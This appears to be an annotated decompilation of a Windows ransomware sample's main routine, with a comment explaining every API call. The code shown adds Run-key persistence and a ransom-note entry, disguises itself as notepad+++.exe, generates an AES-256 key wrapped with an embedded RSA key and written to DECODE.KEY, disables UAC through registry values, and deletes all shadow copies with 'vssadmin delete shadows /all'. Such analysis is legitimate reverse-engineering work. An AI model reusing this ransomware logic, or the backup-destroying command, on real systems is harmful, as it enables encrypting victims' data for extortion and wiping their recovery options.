WPARAM FUN_004018a0(void)

{
  int val_cmp;
  DWORD DVar2;
  BOOL ret_val;
  undefined4 extraout_ECX;
  undefined4 extraout_EDX;
  uint *local_74;
  HCRYPTPROV handle_CSP2;
  HANDLE handle_CSP;
  HCRYPTKEY handle_enc_key;
  DWORD local_58;
  HKEY handle_reg_key;
  
  int nCmdShow = 0;
  
  /* Allocates the specified number of bytes from the heap.
        uFlags = 0x40 : GMEM_ZEROINIT (Initializes memory contents to zero)
        dbBytes = 0x8000 : The number of bytes to allocate */
  uint *current_exec_path = (uint *)GlobalAlloc(0x40,0x8000); 

  /* Retrieves the fully qualified path for the file that contains the specified module
        hModule : If this parameter is NULL, retrieves the path of the executable file of the current process
        lpFilename = Pointer to a buffer that receives the fully qualified path of the module
        nSize = size of lpFilename buffer */
  GetModuleFileNameA((HMODULE)0x0,(LPSTR)current_exec_path,0x8000); 

  /* Compares two character strings. The comparison is not case-sensitive. 
    lpString1 > lpString2 : val_cmp > 0
    lpString1 < lpString2 : val_cmp < 0 
    lpString1 == lpString2 : val_cmp = 0*/
  val_cmp = lstrcmpiA("c:\\Windows\\notepad+++.exe",(LPCSTR)current_exec_path);

  // Only enter if current_exec_path != "c:\\Windows\\notepad+++.exe"
  if (val_cmp != 0) {
        /* Opens the specified registry key.
            hKey = 0x80000002 = HKEY_LOCAL_MACHINE : A handle to an open registry key.
            lpSubKey : The name of the registry subkey to be opened.
            ulOptions : Specifies the option to apply when opening the key.
            samDesired : A mask that specifies the desired access rights to the key to be opened.
            phkResult : A pointer to a variable that receives a handle to the opened key.
        */
        RegOpenKeyExA((HKEY)0x80000002,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\",0,0xf013f,&handle_reg_key);

        /* Determines the length of the specified string
            lpString : The null-terminated string to be checked.
        */
        DVar2 = lstrlenA("c:\\Windows\\notepad.exe \"c:\\How To Restore Files.txt\"");

        /* Sets the data and type of a specified value under a registry key.
            hKey : A handle to an open registry key.
            lpValueName = s_decrypt_0040453e = "decrypt" : The name of the value to be set.
            Reserved : This parameter is reserved and must be zero.
            dwType = 1 = REG_SZ = a string : The type of data pointed to by the lpData parameter. 
            lpData : The data to be stored.
            cbData : The size of the information pointed to by the lpData parameter, in bytes.
        */
        RegSetValueExA(handle_reg_key,"decrypt",0,1,(BYTE *)"c:\\Windows\\notepad.exe \"c:\\How To Restore Files.txt\"",DVar2);
        
        /* Determines the length of the specified string
            lpString : The null-terminated string to be checked. 
        */
        DVar2 = lstrlenA("c:\\Windows\\notepad+++.exe");
        
        /* Sets the data and type of a specified value under a registry key.
            hKey : A handle to an open registry key.
            lpValueName = s_notepad++_0040457b = "notepad++" : The name of the value to be set.
            Reserved : This parameter is reserved and must be zero.
            dwType = 1 = REG_SZ = a string : The type of data pointed to by the lpData parameter. 
            lpData = "c:\\Windows\\notepad+++.exe" : The data to be stored.
            cbData : The size of the information pointed to by the lpData parameter, in bytes.
        */
        RegSetValueExA(handle_reg_key,"notepad++",0,1,(BYTE *)"c:\\Windows\\notepad+++.exe",DVar2);
        
        /* Closes a handle to the specified registry key.
            hKey : A handle to the open key to be closed.
        */
        RegCloseKey(handle_reg_key);
        
        /* Copies an existing file to a new file.
            lpExistingFileName : The name of an existing file.
            lpNewFileName : The name of the new file.
            bFailIfExists
        */
        CopyFileA((LPCSTR)current_exec_path,"c:\\Windows\\notepad+++.exe",0);
        
        nCmdShow = 5;
  }

  /* Acquire a handle to a particular key container within a particular cryptographic service provider (CSP).
  This returned handle is used in calls to CryptoAPI functions that use the selected CSP.
        phProv : A pointer to a handle of a CSP.
        szContainer : The key container name
        szProvider : A null-terminated string that contains the name of the CSP to be used.
        dwProvType = 0x1 = PROV_RSA_FULL : Specifies the type of provider to acquire.
        dwFlags = 0x10 = CRYPT_DELETEKEYSET : Flag values.
  */
  CryptAcquireContextA((HCRYPTPROV *)&handle_CSP,(LPCSTR)0x0,(LPCSTR)0x0,1,0x10); // Delete key container specified by szContainer

   /* Acquire a handle to a particular key container within a particular cryptographic service provider (CSP).
  This returned handle is used in calls to CryptoAPI functions that use the selected CSP.
        dwFlags = 0xf0000000 = CRYPT_VERIFYCONTEXT : Flag values.
  */
  ret_val = CryptAcquireContextA((HCRYPTPROV *)&handle_CSP,(LPCSTR)0x0,(LPCSTR)0x0,1,0xf0000000);

  // If CryptAcquireContextA failed
  if (ret_val == 0) {
    CryptAcquireContextA((HCRYPTPROV *)&handle_CSP,(LPCSTR)0x0,"Microsoft Enhanced Cryptographic Provider v1.0",1,0xf0000000);
  }

  /* The CryptImportKey function transfers a cryptographic key from a key BLOB into a cryptographic service provider (CSP) 
    hProv : The handle of a CSP obtained with the CryptAcquireContext function
    pbData : A BYTE array that contains a PUBLICKEYSTRUC BLOB header followed by the encrypted key
    dwDataLen : Contains the length, in bytes, of the key BLOB
    hPubKey : A handle to the cryptographic key that decrypts the key stored in pbData.
    dwFlags : Currently used only when a public/private key pair in the form of a PRIVATEKEYBLOB is imported into the CSP.
    phKey : A pointer to a HCRYPTKEY value that receives the handle of the imported key.
  */
  CryptImportKey((HCRYPTPROV)handle_CSP,&DAT_004049fd,0x114,0,0,&handle_enc_key);

  /* Acquire a handle to a particular key container within a particular cryptographic service provider (CSP).
  This returned handle is used in calls to CryptoAPI functions that use the selected CSP.
        dwProvType = 0x18 = PROV_RSA_AES : Specifies the type of provider to acquire.
        dwFlags = 0xf0000000 = CRYPT_VERIFYCONTEXT : Flag values.
  */
  CryptAcquireContextA(&handle_CSP2,(LPCSTR)0x0,(LPCSTR)0x0,0x18,0xf0000000);
  
  /*The CryptGenKey function generates a random cryptographic session key or a public/private key pair. 
    A handle to the key or key pair is returned in phKey. This handle can then be used as needed with 
    any CryptoAPI function that requires a key handle.
        hProv : A handle to a cryptographic service provider (CSP) created by a call to CryptAcquireContext.
        Algid = 0x6610 = CALG_AES_256 : An ALG_ID value that identifies the algorithm for which the key is to be generated.
        dwFlags : Specifies the type of key generated.
        phKey : Address to which the function copies the handle of the newly generated key. 
  */
  CryptGenKey(handle_CSP2,0x6610,1,&genKey);

  DWORD size_pbData = 0x2c;
  /* The CryptExportKey function exports a cryptographic key or a key pair from a cryptographic
     service provider (CSP) in a secure manner.
     hKey : A handle to the key to be exported.
     hExpKey : A handle to a cryptographic key of the destination user. 
     dwBlobType = 8 = PLAINTEXTKEYBLOB : Specifies the type of key BLOB to be exported in pbData. 
     dwFlags : Specifies additional options for the function.
     pbData : A pointer to a buffer that receives the key BLOB data
     pdwDataLen : A pointer to a DWORD value that, on entry, contains the size, in bytes, of the buffer pointed to by the pbData parameter. When the function returns, this value contains the number of bytes stored in the buffer.
  */
  CryptExportKey(genKey,0,8,0,(BYTE *)current_exec_path,&size_pbData);

  size_pbData = 0x2c;

  /* The CryptEncrypt function encrypts data.
        hKey : A handle to the encryption key.
        hHash : A handle to a hash object
        Final : A Boolean value that specifies whether this is the last section in a series being encrypted.
        dwFlags : The following dwFlags value is defined but reserved for future use.
        pbData : A pointer to a buffer that contains the plaintext to be encrypted.
        pdwDataLen : A pointer to a DWORD value that , on entry, contains the length, in bytes, of the plaintext in the pbData buffer. 
        dwBufLen : Specifies the total size, in bytes, of the input pbData buffer.
  */
  CryptEncrypt(handle_enc_key,0,1,0,(BYTE *)current_exec_path,&size_pbData,256);

  /* The CryptDestroyKey function releases the handle referenced by the hKey parameter.
        hKey : The handle of the key to be destroyed.
  */
  CryptDestroyKey(handle_enc_key);

  /* Acquire a handle to a particular key container within a particular cryptographic service provider (CSP).
     This returned handle is used in calls to CryptoAPI functions that use the selected CSP.
        dwProvType = 0x1 = PROV_RSA_FULL : Specifies the type of provider to acquire.
        dwFlags = 0x10 = CRYPT_DELETEKEYSET : Flag values.
  */
  CryptAcquireContextA((HCRYPTPROV *)&handle_CSP,(LPCSTR)0x0,(LPCSTR)0x0,1,0x10);

  /* Creates or opens a file or I/O device.
        lpFileName = "c:\\Windows\\DECODE.KEY" : The name of the file or device to be created or opened.
        dwDesiredAccess = 0xc0000000 = generic read and generic write : The requested access to the file or device, which can be summarized as read, write, both or neither zero).
        dwShareMode : The requested sharing mode of the file or device
        lpSecurityAttributes : A pointer to a SECURITY_ATTRIBUTES structure that contains two separate but related data members: an optional security descriptor, and a Boolean value that determines whether the returned handle can be inherited by child processes.
        dwCreationDisposition = 4 = OPEN_ALWAYS : An action to take on a file or device that exists or does not exist.
        dwFlagsAndAttributes : The file or device attributes and flags
        hTemplateFile : A valid handle to a template file with the GENERIC_READ access right.
  */
  HANDLE local_68 = CreateFileA("c:\\Windows\\DECODE.KEY",0xc0000000,0,(LPSECURITY_ATTRIBUTES)0x0,4,0,(HANDLE)0x0);
  
  /* Moves the file pointer of the specified file.
        hFile : A handle to the file.
        lDistanceToMove : The low order 32-bits of a signed value that specifies the number of bytes to move the file pointer.
        lpDistanceToMoveHigh : A pointer to the high order 32-bits of the signed 64-bit distance to move.
        dwMoveMethod = 2 = FILE_END : The starting point for the file pointer move, here the starting point is the current end-of-file position.
  */
  SetFilePointer(local_68,0,(PLONG)0x0,2);

  /* Writes data to the specified file or input/output (I/O) device.
        hFile : A handle to the file or I/O device
        lpBuffer : A pointer to the buffer containing the data to be written to the file or device.
        nNumberOfBytesToWrite : The number of bytes to be written to the file or device.
        lpNumberOfBytesWritten : A pointer to the variable that receives the number of bytes written when using a synchronous hFile parameter. 
        lpOverlapped : A pointer to an OVERLAPPED structure is required if the hFile parameter was opened with FILE_FLAG_OVERLAPPED, otherwise this parameter can be NULL. 
  */  
  WriteFile(local_68,current_exec_path,256,&local_58,(LPOVERLAPPED)0x0);
  
  /* Closes an open object handle.
        hObject : A valid handle to an open object.
  */
  CloseHandle(local_68);
  
  local_74 = current_exec_path + 256;
  
  FUN_00401816(extraout_ECX,extraout_EDX,current_exec_path,(undefined *)local_74,256);
  
  local_74 += 4;
  
  /* Copies the contents of a source memory block to a destination memory block, and supports overlapping source and destination memory blocks.
        Destination : A pointer to the destination memory block to copy the bytes to.
        Source : A pointer to the source memory block to copy the bytes from.
        Length : The number of bytes to copy from the source to the destination.
  */
  RtlMoveMemory(0x0040405a + 0x22,local_74,10);
  
  /* Maps a character string to a UTF-16 (wide character) string.
        CodePage : Code page to use in performing the conversion. 
        dwFlags : Flags indicating the conversion type.
        lpMultiByteStr : Pointer to the character string to convert.
        cbMultiByte : Size, in bytes, of the string indicated by the lpMultiByteStr parameter. This parameter can be set to -1 if the string is null-terminated. µ
                      If this parameter is -1, the function processes the entire input string, including the terminating null character. Therefore, the resulting Unicode string has a terminating null character, and the length returned by the function includes this character.
        lpWideCharStr : Pointer to a buffer that receives the converted string.
        cchWideChar : Size, in characters, of the buffer indicated by lpWideCharStr. 
  */
  MultiByteToWideChar(3,0,(LPCSTR)local_74,-1,0x004042c1 + 4,10);
  
  /* Opens the specified registry key.
        hKey = 0x80000002 = HKEY_LOCAL_MACHINE : A handle to an open registry key.
        lpSubKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\DateTime\\" : The name of the registry subkey to be opened.
        ulOptions : Specifies the option to apply when opening the key.
        samDesired : A mask that specifies the desired access rights to the key to be opened.
        phkResult : A pointer to a variable that receives a handle to the opened key.
  */
  RegOpenKeyExA((HKEY)0x80000002,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\DateTime\\",0,0xf013f,&handle_reg_key);
  
  DWORD size_lpData = 10;
  
  /* Retrieves the type and data for the specified value name associated with an open registry key.
        hKey : A handle to an open registry key.
        lpValueName : The name of the registry value.
        lpReserved : This parameter is reserved and must be NULL.
        lpType : A pointer to a variable that receives a code indicating the type of data stored in the specified value. 
        lpData : A pointer to a buffer that receives the value's data. 
        lpcbData : A pointer to a variable that specifies the size of the buffer pointed to by the lpData parameter, in bytes. 
                   When the function returns, this variable contains the size of the data copied to lpData.
  
    If the function succeeds, the return value is ERROR_SUCCESS. If the function fails, the return value is a system error code.
  */
  
  LSTATUS ret_status = RegQueryValueExA(handle_reg_key,"notepad++",(LPDWORD)0x0,(LPDWORD)0x0,(LPBYTE)(0x0040405a + 0x22),&size_lpData);
  
  if ((ret_status != 0) || (size_lpData != 10)) {
    /* Sets the data and type of a specified value under a registry key.
        hKey : A handle to an open registry key.
        lpValueName : The name of the value to be set.
        Reserved : This parameter is reserved and must be zero.
        dwType = 1 = REG_SZ = a string : The type of data pointed to by the lpData parameter. 
        lpData : The data to be stored.
        cbData : The size of the information pointed to by the lpData parameter, in bytes.
    */
    RegSetValueExA(handle_reg_key,"notepad++",0,1,(BYTE *)local_74,10);
  }
  
  *(undefined4 *)((int)local_74 + 10) = 0;

  /* Sets the data and type of a specified value under a registry key.
      hKey : A handle to an open registry key.
      lpValueName : The name of the value to be set.
      Reserved : This parameter is reserved and must be zero.
      dwType = 3 = REG_BINARY = Binary data in any form : The type of data pointed to by the lpData parameter. 
      lpData : The data to be stored.
      cbData : The size of the information pointed to by the lpData parameter, in bytes.
  */
  RegSetValueExA(handle_reg_key,(LPCSTR)local_74,0,3,(BYTE *)current_exec_path,256);

  /* Closes a handle to the specified registry key.
      hKey : A handle to the open key to be closed.
  */
  RegCloseKey(handle_reg_key);

  /* The RtlZeroMemory routine fills a block of memory with zeros, given a pointer to the block and the length, in bytes, to be filled.
      Destination : A pointer to the memory block to be filled with zeros.
      Length : The number of bytes to fill with zeros.
  */
  RtlZeroMemory(current_exec_path,32768);

  /* Opens the specified registry key.
      hKey = 0x80000002 = HKEY_LOCAL_MACHINE : A handle to an open registry key.
      lpSubKey : The name of the registry subkey to be opened.
      ulOptions : Specifies the option to apply when opening the key.
      samDesired : A mask that specifies the desired access rights to the key to be opened.
      phkResult : A pointer to a variable that receives a handle to the opened key.
  */
  RegOpenKeyExA((HKEY)0x80000002,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\",0,0xf013f,&handle_reg_key);
  
  /* Sets the data and type of a specified value under a registry key.
      hKey : A handle to an open registry key.
      lpValueName : The name of the value to be set.
      Reserved : This parameter is reserved and must be zero.
      dwType = 4 = REG_DWORD = A 32-bit number : The type of data pointed to by the lpData parameter. 
      lpData : The data to be stored.
      cbData : The size of the information pointed to by the lpData parameter, in bytes.
  */
  RegSetValueExA(handle_reg_key,"PromptOnSecureDesktop",0,4,(BYTE *)current_exec_path,4);
  RegSetValueExA(handle_reg_key,"EnableLUA",0,4,(BYTE *)current_exec_path,4);
  RegSetValueExA(handle_reg_key,"ConsentPromptBehaviorAdmin",0,4,(BYTE *)current_exec_path,4);
  
  /* Closes a handle to the specified registry key.
      hKey : A handle to the open key to be closed.
  */
  RegCloseKey(handle_reg_key);

  /* Retrieves the contents of the specified variable from the environment block of the calling process.
      lpName : The name of the environment variable.
      lpBuffer : A pointer to a buffer that receives the contents of the specified environment variable as a null-terminated string.
      nSize : The size of the buffer pointed to by the lpBuffer parameter, including the null-terminating character, in characters.
  */
  GetEnvironmentVariableA("ComSpec",(LPSTR)current_exec_path,1500);

  /* Performs an operation on a specified file.
      hwnd : A handle to the parent window used for displaying a UI or error messages. This value can be NULL if the operation is not associated with a window.
      lpOperation : A pointer to a null-terminated string, referred to in this case as a verb, that specifies the action to be performed.
      lpFile : A pointer to a null-terminated string that specifies the file or object on which to execute the specified verb.
      lpParameters : If lpFile specifies an executable file, this parameter is a pointer to a null-terminated string that specifies the parameters to be passed to the application. 
      lpDirectory : A pointer to a null-terminated string that specifies the default (working) directory for the action. If this value is NULL, the current working directory is used.
      nShowCmd : The flags that specify how an application is to be displayed when it is opened.
  */
  ShellExecuteA((HWND)0x0,(LPCSTR)0x0,(LPCSTR)current_exec_path,"/c vssadmin delete shadows /all",(LPCSTR)0x0,0);
  
  /* Frees the specified global memory object and invalidates its handle.
      hMem : A handle to the global memory object.
  */
  GlobalFree(current_exec_path);
  
  /* Controls whether the system will handle the specified types of serious errors or whether the process will handle them.
      uMode = 1 = SEM_FAILCRITICALERRORS = The system does not display the critical-error-handler message box. Instead, the system sends the error to the calling process. : The process error mode.
  */
  SetErrorMode(1);
  
  /* Creates a thread to execute within the virtual address space of the calling process.
      lpThreadAttributes : A pointer to a SECURITY_ATTRIBUTES structure that determines whether the returned handle can be inherited by child processes. If lpThreadAttributes is NULL, the handle cannot be inherited.
      dwStackSize : The initial size of the stack, in bytes.
      lpStartAddress : A pointer to the application-defined function to be executed by the thread.
      lpParameter : A pointer to a variable to be passed to the thread.
      dwCreationFlags = 0 = The thread runs immediately after creation : The flags that control the creation of the thread.
      lpThreadId : A pointer to a variable that receives the thread identifier
  */
  DWORD thread;
  CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_00401eda,(LPVOID)0x0,0,&thread);
  
  /* Registers and initializes certain common control window classes. */
  InitCommonControls();
  
  WNDCLASSEXA local_34;    // Contains window class information.
  local_34.cbSize = 0x30;  // The size, in bytes, of this structure.
  local_34.style = 3;      // The class style(s). 
  local_34.lpfnWndProc = (WNDPROC)&LAB_00401cd5; // A pointer to the window procedure. 
  local_34.cbClsExtra = 0; // The number of extra bytes to allocate following the window-class structure. 
  local_34.cbWndExtra = 30; // The number of extra bytes to allocate following the window instance. 
  local_34.hInstance = DAT_00404b2c; // A handle to the instance that contains the window procedure for the class.
  local_34.hbrBackground = (HBRUSH)0x10; // A handle to the class background brush. 
  local_34.lpszClassName = "notepad++";  // A pointer to a null-terminated string or is an atom.
  
  /* Registers a window class for subsequent use in calls to the CreateWindow or CreateWindowEx function. 
      unnamedParam1 : A pointer to a WNDCLASSEXA structure.
  */
  RegisterClassExA(&local_34);

  /* Creates a modeless dialog box from a dialog box template resource.
      hInstance : A handle to the module which contains the dialog box template
      lpTemplateName : The dialog box template.
      hWndParent : A handle to the window that owns the dialog box.
      lpDialogFunc : A pointer to the dialog box procedure. 
      dwInitParam : The value to be passed to the dialog box procedure in the lParam parameter in the WM_INITDIALOG message.
  */
  CreateDialogParamA(DAT_00404b2c,(LPCSTR)0x65,(HWND)0x0,(DLGPROC)&LAB_00401cd5,0);

  /* Sets the specified window's show state.
      hWnd : A handle to the window.
      nCmdShow = 0 (SW_HIDE = Hides the window and activates another window) or 5 (SW_SHOW = Activates the window and displays it in its current size and position) 
               : Controls how the window is to be shown.
  */
  ShowWindow(DAT_00404b28,nCmdShow);
  
  /* The UpdateWindow function updates the client area of the specified window by sending a WM_PAINT message to the window if the window's update region is not empty.
      hWnd : Handle to the window to be updated.
  */
  UpdateWindow(DAT_00404b28);

  /* Retrieves a message from the calling thread's message queue.
      lpMsg : A pointer to an MSG structure that receives message information from the thread's message queue.
      hWnd : A handle to the window whose messages are to be retrieved. If hWnd is NULL, GetMessage retrieves messages for any window that belongs to the current thread, and any messages on the current thread's message queue whose hwnd value is NULL
      wMsgFilterMin : The integer value of the lowest message value to be retrieved.
      wMsgFilterMax : The integer value of the highest message value to be retrieved.

      /!\ If wMsgFilterMin and wMsgFilterMax are both zero, GetMessage returns all available messages
  */  
  tagMSG local_50;
  while (ret_val = GetMessageA((LPMSG)&local_50,(HWND)0x0,0,0), ret_val != 0) {

    /* Translates virtual-key messages into character messages. 
        lpMsg : A pointer to an MSG structure that contains message information retrieved from the calling thread's message queue by using the GetMessage or PeekMessage function.
    */
    TranslateMessage((MSG *)&local_50);
    
    /* Dispatches a message to a window procedure.
        lpMsg : A pointer to a structure that contains the message.
    */
    DispatchMessageA((MSG *)&local_50);
  }
  
  /* The CryptDestroyKey function releases the handle referenced by the hKey parameter.
      hKey : The handle of the key to be destroyed.
  */
  CryptDestroyKey(genKey);
  
  return local_50.wParam;
}


FUN_00401816(undefined4 param_1,undefined4 param_2,uint *param_3,undefined *param_4,uint param_5)
{
  uint uVar1;
  uint uVar2;
  undefined4 in_EAX;
  uint uVar3;
  char *pcVar4;
  
  if (param_5 != 0) {
    do {
      uVar1 = *param_3;
      uVar3 = uVar1;
      if ((param_5 < 3) && (uVar3 = uVar1 & 0xffff, param_5 < 2)) {
        uVar3 = uVar1 & 0xff;
      }
      uVar2 = (uVar3 & 0xff0000) >> 8;
      uVar1 = uVar2 | (uVar3 & 0xff00) << 8;
      *param_4 = s_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef_004043f6[(uVar3 << 0x18) >> 0x1a];
      param_4[1] = s_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef_004043f6
                   [(uVar1 | uVar3 << 0x18) >> 0x14 & 0x3f];
      if (param_5 == 1) {
        param_4[2] = '=';
LAB_00401891:
        pcVar4 = param_4 + 3;
        param_4 = param_4 + 4;
        *pcVar4 = '=';
        break;
      }
      pcVar4 = param_4 + 3;
      param_4[2] = s_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef_004043f6[(uVar1 & 0xfc000) >> 0xe];
      if (param_5 == 2) goto LAB_00401891;
      param_4 = param_4 + 4;
      *pcVar4 = s_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef_004043f6[(uVar2 & 0x3f00) >> 8];
      param_3 = (uint *)((int)param_3 + 3);
      param_5 = param_5 - 3;
    } while (param_5 != 0);
  }
  *param_4 = '\0';
  return CONCAT44(param_2,in_EAX);
}